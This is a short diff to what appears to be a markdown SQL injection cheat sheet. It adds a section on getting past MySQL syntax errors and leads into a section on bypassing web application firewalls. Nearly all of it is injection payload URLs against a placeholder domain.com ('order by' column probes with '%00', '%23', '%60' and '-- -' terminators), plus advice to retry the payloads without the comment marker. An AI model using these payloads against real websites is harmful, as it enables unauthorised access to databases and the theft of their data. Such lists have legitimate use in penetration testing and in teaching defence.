@@ -1,11 +1,14 @@
 ## Stabilise the error message
-Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error.  
+Whenever the website keeps showing up erros on MySQL syntax, it is required to enter queries to fix the error. This usually happens when server doesn't accept ```-- -``` inside the queries. 
 
 ```http://domain.com/index.php?id=1' order by 1;%00-- -```   no error  
 ```http://domain.com/index.php?id=1' order by 1;%60-- - ```  no error  
+```http://domain.com/index.php?id=1' order by 1%23-- - ```  no error  
 ```http://domain.com/index.php?id=1' order by 1%60-- - ```  no error  
 ```http://domain.com/index.php?id=1'%23/* order by 1-- - ```  no error  
 ```http://domain.com/index.php?id=1') order by 1-- - ```  no error  
+
+If MySQL Syntax Error still persists, simply try again the payloads, but this time, without ```-- -```
 
 
 ## Whitespace WAF-based bypass
